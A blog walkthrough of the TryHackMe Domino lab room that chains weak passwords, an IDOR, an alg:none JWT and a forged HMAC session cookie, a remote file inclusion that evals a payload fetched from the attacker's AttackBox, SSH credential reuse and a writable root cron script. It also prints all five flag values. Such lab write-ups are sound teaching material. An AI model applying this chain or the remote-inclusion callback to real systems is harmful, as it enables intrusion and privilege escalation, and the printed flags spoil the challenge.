---
title: "TryHackMe Domino: IDOR to Forged JWT to RCE to Root"
date: 2026-10-10T19:44:00+05:30
lastmod: 2026-10-10T19:44:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-domino/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Jr Penetration Tester
  - Jr Pentester Challenges
  - Penetration Testing
  - IDOR
  - JWT
  - Remote File Inclusion
  - Privilege Escalation
  - Web Exploitation

draft: false
description: "Walkthrough of TryHackMe Domino: weak creds, IDOR, forged session cookie and JWT, an RFI eval sink for RCE, SSH credential reuse, and a cron root privesc."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Domino |![Domino room icon](https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1779111847303)|

Domino is a medium challenge in the Jr Pentester Challenges module, the capstone of the Jr Penetration Tester path where the guided walkthroughs stop and you chain bugs yourself. It is the same muscle the earlier [Guided Pentest Web](/post/thm-room-guidedpentestweb/) room drilled, four bugs into a shell, and the same file-read-feeds-SQLi pattern from [Recruit](/post/thm-room-recruitwebchallenge/). The target is the NexusCorp Employee Portal, and the name is the whole hint: each small weakness knocks over the next, from an unprivileged login all the way to root.

This is a single "Challenge" task with five flags. The box was reachable directly from my Mac over the TryHackMe VPN (`utun13`), so most of the work is curl and ssh with one detour through the AttackBox for the remote-file-inclusion callback. Every flag below was verified correct by the TryHackMe answer checker.

## Recon: the portal and its leftovers

An nmap of the target shows Apache on 80 and OpenSSH on 22. The portal at `/` is a PHP login form (`firstname.lastname`), with `/forgot.php` and `/team.php` linked underneath. The team page is a free username list: seven employees with `firstname.lastname@nexus.corp` emails, including Robert Wilson (DevOps Engineer) and James Wright (Systems Administrator).

A short content scan turns up the interesting paths: `/admin/` (an app-level 403), `/api/`, a browsable `/backup/`, and `reset.php`. The backup directory hands over two files.

```text
  # /backup/README.txt
  config.enc  - Encrypted application configuration (AES-128-ECB)
  Decryption key reference: see static/app.js (deployment notes)
```

`static/app.js` leaks the key in a comment, and the padding note in it is a small trap: it says to pad `N3xusK3y2024!!` to 16 bytes "with  " (spaces), but the file actually decrypts with null padding, not spaces.

```text
  # AES-128-ECB, key = b'N3xusK3y2024!!' + b'\x00\x00'  (NOT space padded)
  {"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

That `system_user: devops` is a note for much later. It does not get us in on its own.

## Flag 1: weak credentials and a horizontal IDOR

The `/api/login.php` endpoint is a username oracle: an unknown user returns "No account found with that username", a known one returns "Invalid credentials". That confirms the seven team members are the only accounts (`admin`, `devops`, `root` are not login users). SQL injection and type juggling on the login both go nowhere, so the way in is simpler than it looks: a small spray finds three users sharing the password `password`, among them `robert.wilson`.

Logging in through the HTML form at `/index.php` sets a session cookie, and its shape is the next bug.

```text
  # nexus_session = base64(JSON) . hmac_sha256(base64, APP_SECRET)
  {"user_id":4,"username":"robert.wilson","role":"user"}
```

The API-side profile endpoint takes an `id` with no ownership check. Walking it from `id=1` immediately leaks every user's record, and user 1 (laura.hayes, the admin) carries the first flag in her notes.

![IDOR enumeration of profile.php returning laura.hayes admin notes with flag one](/img/thm-domino/01-idor.png)

```text
  # GET /api/users/profile.php?id=1  (session cookie from robert.wilson)
  {"id":1,"username":"laura.hayes","role":"admin","notes":"THM{...}"}
```

The first flag is **`THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`**, a textbook horizontal IDOR: one logged-in user reading another user's data by changing a number.

## Flag 2: forging the admin session cookie

The session cookie is signed, but with a secret the app has not protected well. Before cracking anything, note what the dashboard tells an authenticated user: there is a File Viewer at `/api/files.php?name=` that "Requires JWT authentication via /api/auth/token.php". That endpoint hands the logged-in user a JWT. Two different trust tokens, two different secrets, both weak.

The HS256 JWT turns out to accept `alg:none`, so a payload with `"role":"admin"` is trusted with no signature. Using that admin JWT, the File Viewer reads any file under `/var/www/html/`, including the login source, which leaks the config.

```text
  # GET /api/files.php?name=/var/www/html/config.php  (admin JWT)
  define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
  define('APP_SECRET', 'nexus_app_k3y_2024');
  define('DB_PASS',    'D3v0ps!2024');
```

With `APP_SECRET` in hand, forging the signed session cookie for the admin is mechanical: base64 the JSON `{"user_id":1,"username":"laura.hayes","role":"admin"}`, append `hmac_sha256(data, APP_SECRET)`, and send it. The `/admin/` panel then renders and prints the second flag.

```text
  # GET /admin/  with forged nexus_session (role=admin)
  Logged in as: laura.hayes
  Internal reference: THM{...}
```

The second flag is **`THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}`**. The name hints at the intended "admin bot visits a ticket" path, but a forged signature gets you the same admin session directly.

{{< ad >}}

## Flag 3: an RFI eval sink for RCE

Reading `/var/www/html/api/files.php` through the File Viewer exposes exactly why it is dangerous. Before the path check that keeps local reads inside `/var/www/html/`, there is a branch that treats any `http://` or `https://` value as remote PHP to run.

```text
  # inside files.php, reached when name starts with http:// or https://
  $remote = @file_get_contents($name);
  ob_start();
  eval(str_replace("<?php", "", $remote));   // remote file inclusion -> code execution
```

So an admin JWT plus a URL you control is remote code execution. The local firewall on my Mac blocked the target's callback (the eval needs the server to reach back to the payload host), so I hosted the one-line PHP payload on the TryHackMe AttackBox, which is always reachable from the lab, and pointed `name=` at it.

![AttackBox hosting the RFI payload and the target returning command output and flag three](/img/thm-domino/03-rfi-rce.png)

```text
  # GET /api/files.php?name=http://ATTACKBOX:8080/p.php   (admin JWT)
  {"output":"RCE_UID=uid=33(www-data) ... FLAG3=THM{...}"}
```

Code runs as `www-data`, and the payload reads the flag the path check would otherwise have blocked at `/opt/flag3.txt`. The third flag is **`THM{rf1_2_rc3_f00th0ld_fl4g3}`**. A real target rarely spells `eval()` out so plainly, but the lesson transfers: any sink that fetches a user-supplied URL and interprets the result (template includes, server-side renderers, deserialisers) is the same class of bug.

## Flag 4: SSH credential reuse

The `config.php` leak already gave the database password `D3v0ps!2024`, and the encrypted backup named `devops` as the system user. Reused credentials are the oldest lateral move there is, and here it lands: `devops` logs in over SSH with that same password. The home directory holds `user.txt`.

```text
  # ssh devops@TARGET  (password reused from DB config)
  uid=1001(devops) gid=1001(devops) groups=1001(devops)
  THM{...}  # ~/user.txt
```

The fourth flag is **`THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`**, and the name says it plainly: credential reuse for lateral movement. The RCE foothold as `www-data` would have reached the same place, but the reused password is the cleaner, more realistic path.

## Flag 5: a writable root cron script

`devops` cannot run sudo. Enumerating files the user can write turns up two under `/opt`, and one of them is a root-owned monitoring script that the group `devops` can edit.

```text
  # root runs this every minute (nexus_health.log updates each minute)
  -rwxrwxr-- 1 root devops /opt/monitoring/health_report.sh
```

Group write on a script that root executes on a schedule is game over. Appending a line that copies bash to a SUID binary, waiting one minute for the cron, and running that bash with `-p` gives a root-owned effective UID and the root flag. I restored the script from a backup afterwards so the box is left as found.

![Privilege escalation via the writable cron script giving euid root and flag five](/img/thm-domino/04-privesc.png)

```text
  # after the cron runs the tampered script
  uid=1001(devops) ... euid=0(root) egid=0(root)
  THM{...}  # /root/root.txt
```

The fifth flag is **`THM{pr1v3sc_cr0n_r00t_fl4g5}`**. The actionable detail is that write permission on the script, not ownership of it, is what matters: a `root:root` script is still a root escalation if its directory or the file itself is group-writable by you.

## Takeaways

Two things worth carrying out of this room:

- **Trust boundaries fail at the signature, not the login.** Domino never needed a password after the first one. An unsigned session field, an `alg:none` JWT, and a weak HMAC secret each let a normal user assert `role:admin`. If a cookie or token decides authorisation, verify its signature with a strong secret and reject `alg:none`, because reading the role out of attacker-controlled data is the same as having no auth at all.
- **A URL parameter that gets interpreted is RCE waiting to happen.** The File Viewer looked like a read primitive until one branch fed a remote URL to `eval()`. When you find any feature that fetches a user-supplied URL, ask what happens to the response: included, templated, deserialised, or run. That question is where server-side request forgery turns into remote code execution.

Room solved 100%: 1 task, 5 flags.
